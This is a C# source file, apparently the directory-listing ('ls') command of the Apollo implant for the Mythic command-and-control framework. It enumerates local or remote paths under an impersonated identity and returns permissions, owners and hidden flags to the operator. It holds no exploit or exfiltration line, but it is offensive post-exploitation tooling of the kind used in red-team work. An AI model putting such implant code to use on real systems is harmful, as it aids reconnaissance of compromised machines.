#define COMMAND_NAME_UPPER

#if DEBUG
#undef LS
#define LS
#endif

#if LS
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using Apollo.Jobs;
using Apollo.Tasks;
using Mythic.Structs;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Text;

namespace Apollo.CommandModules
{

    public class DirectoryList
    {

        private static Dictionary<string, string>[] GetPermissions(FileInfo fi)
        {
            List<Dictionary<string, string>> permissions = new List<Dictionary<string, string>>();
            try
            {
                FileSecurity fsec = fi.GetAccessControl(AccessControlSections.Access);
                foreach (FileSystemAccessRule FSAR in fsec.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
                {
                    var tmp = GetAceInformation(FSAR);
                    if (tmp.Keys.Count == 0)
                        continue;
                    permissions.Add(tmp);
                }
            }
            catch { }

            return permissions.ToArray();
        }
        private static Dictionary<string, string>[] GetPermissions(DirectoryInfo di)
        {
            List<Dictionary<string, string>> permissions = new List<Dictionary<string, string>>();
            try
            {
                DirectorySecurity DirSec = di.GetAccessControl(AccessControlSections.Access);
                foreach (FileSystemAccessRule FSAR in DirSec.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
                {
                    var tmp = GetAceInformation(FSAR);
                    if (tmp.Keys.Count == 0)
                        continue;
                    permissions.Add(tmp);
                }
            }
            catch { }

            return permissions.ToArray();
        }

        private static Dictionary<string, string> GetAceInformation(FileSystemAccessRule ace)
        {
            StringBuilder info = new StringBuilder();
            Dictionary<string, string> results = new Dictionary<string, string>();
            results["account"] = ace.IdentityReference.Value;
            results["type"] = ace.AccessControlType.ToString();
            results["rights"] = ace.FileSystemRights.ToString();
            results["is_inherited"] = ace.IsInherited.ToString();
            return results;
        }

        internal static string FormatPath(FileBrowserParameters parameters)
        {
            string path = "";
            if (!string.IsNullOrEmpty(parameters.host) &&
                parameters.host != Environment.GetEnvironmentVariable("COMPUTERNAME") &&
                parameters.host.ToLower() != "localhost" &&
                parameters.host.ToLower() != "127.0.0.1" &&
                !string.IsNullOrEmpty(parameters.path) &&
                parameters.path[0] != '\\')
            {
                path = string.Format("\\\\{0}\\{1}", parameters.host, parameters.path);
            }
            else
            {
                path = parameters.path;
            }
            if (string.IsNullOrEmpty(path))
                path = ".";
            return path;
        }

        /// <summary>
        /// List all files and directories in a specified path.
        /// </summary>
        /// <param name="job">
        /// Job responsible for this task. job.Task.parameters is
        /// a string of the path to list.
        /// </param>
        /// <param name="implant">Agent this task is run on.</param>
        public static void Execute(Job job, Agent implant)
        {
            WindowsIdentity ident = Credentials.CredentialManager.CurrentIdentity;
            Task task = job.Task;
            FileBrowserParameters parameters = JsonConvert.DeserializeObject<FileBrowserParameters>(task.parameters);
            if (string.IsNullOrEmpty(parameters.host))
                parameters.host = Environment.GetEnvironmentVariable("COMPUTERNAME");

            string path = FormatPath(parameters);

            List<Mythic.Structs.FileInformation> fileListResults = new List<Mythic.Structs.FileInformation>();
            FileBrowserResponse resp;
            if (File.Exists(path))
            {
                try
                {
                    FileInfo finfo = new FileInfo(path);

                    resp = new FileBrowserResponse()
                    {
                        host = parameters.host,
                        is_file = true,
                        permissions = GetPermissions(finfo),
                        name = finfo.Name,
                        parent_path = finfo.DirectoryName,
                        success = true,
                        access_time = finfo.LastAccessTimeUtc.ToString(),
                        modify_time = finfo.LastWriteTimeUtc.ToString(),
                        size = finfo.Length,
                        files = new FileInformation[0]
                    };
                }
                catch (Exception ex)
                {
                    resp = new FileBrowserResponse()
                    {
                        host = parameters.host,
                        is_file = true,
                        permissions = new Dictionary<string, string>[0],
                        name = path,
                        parent_path = "",
                        success = false,
                        access_time = "",
                        modify_time = "",
                        size = -1,
                        files = new FileInformation[0]
                    };
                    job.SetError(string.Format("Error attempting to get file {0}: {1}", path, ex.Message));
                }
            }
            else
            {
                try // Invalid path causes a crash if we don't handle exceptions
                {
                    DirectoryInfo pathDir = new DirectoryInfo(path);

                    resp = new FileBrowserResponse()
                    {
                        host = parameters.host,
                        is_file = false,
                        permissions = GetPermissions(pathDir),
                        name = pathDir.Name,
                        parent_path = pathDir.Parent != null ? pathDir.Parent.FullName : "",
                        success = true,
                        access_time = pathDir.LastAccessTimeUtc.ToString(),
                        modify_time = pathDir.LastWriteTimeUtc.ToString(),
                        size = 0,
                        files = new FileInformation[0]
                    };

                    string[] directories = Directory.GetDirectories(path);
                    foreach (string dir in directories)
                    {
                        try
                        {
                            DirectoryInfo dirInfo = new DirectoryInfo(dir);

                            fileListResults.Add(new Mythic.Structs.FileInformation()
                            {
                                full_name = dirInfo.FullName,
                                name = dirInfo.Name,
                                directory = dirInfo.Parent.ToString(),
                                creation_date = dirInfo.CreationTimeUtc.ToString(),
                                modify_time = dirInfo.LastWriteTimeUtc.ToString(),
                                access_time = dirInfo.LastAccessTimeUtc.ToString(),
                                permissions = GetPermissions(dirInfo), // This isn't gonna be right.
                                extended_attributes = dirInfo.Attributes.ToString(), // This isn't gonna be right.
                                size = 0,
                                is_file = false,
                                owner = File.GetAccessControl(path).GetOwner(typeof(System.Security.Principal.NTAccount)).ToString(),
                                group = "",
                                hidden = ((dirInfo.Attributes & System.IO.FileAttributes.Hidden) == FileAttributes.Hidden)
                            });
                        }
                        catch
                        {
                            // Suppress exceptions
                        }
                    }
                }
                catch (DirectoryNotFoundException e)
                {
                    resp = new FileBrowserResponse()
                    {
                        host = parameters.host,
                        is_file = false,
                        permissions = new Dictionary<string, string>[0],
                        name = path,
                        parent_path = "",
                        success = false,
                        access_time = "",
                        modify_time = "",
                        size = 0,
                        files = new FileInformation[0]
                    };
                    job.SetError($"Error: {e.Message}");
                    return;
                }
                catch (Exception e)
                {
                    resp = new FileBrowserResponse()
                    {
                        host = parameters.host,
                        is_file = true,
                        permissions = new Dictionary<string, string>[0],
                        name = path,
                        parent_path = "",
                        success = false,
                        access_time = "",
                        modify_time = "",
                        size = 0,
                        files = new FileInformation[0]
                    };
                    job.SetError($"Error: {e.Message}");
                    return;
                }

                try // Catch exceptions from Directory.GetFiles
                {
                    string[] files = Directory.GetFiles(path);
                    foreach (string file in files)
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            fileListResults.Add(new Mythic.Structs.FileInformation()
                            {
                                full_name = fileInfo.FullName,
                                name = fileInfo.Name,
                                directory = fileInfo.DirectoryName,
                                creation_date = fileInfo.CreationTimeUtc.ToString(),
                                modify_time = fileInfo.LastWriteTimeUtc.ToString(),
                                access_time = fileInfo.LastAccessTimeUtc.ToString(),
                                permissions = GetPermissions(fileInfo), // This isn't gonna be right.
                                extended_attributes = fileInfo.Attributes.ToString(), // This isn't gonna be right.
                                size = fileInfo.Length,
                                is_file = true,
                                owner = File.GetAccessControl(path).GetOwner(typeof(System.Security.Principal.NTAccount)).ToString(),
                                group = "",
                                hidden = ((fileInfo.Attributes & System.IO.FileAttributes.Hidden) == FileAttributes.Hidden)
                            });

                        }
                        catch
                        {
                            // Suppress exceptions
                        }
                    }
                }
                catch (Exception e)
                {

                }
            }

            resp.files = fileListResults.ToArray();
            job.SetComplete(resp);

        }
    }
}
#endif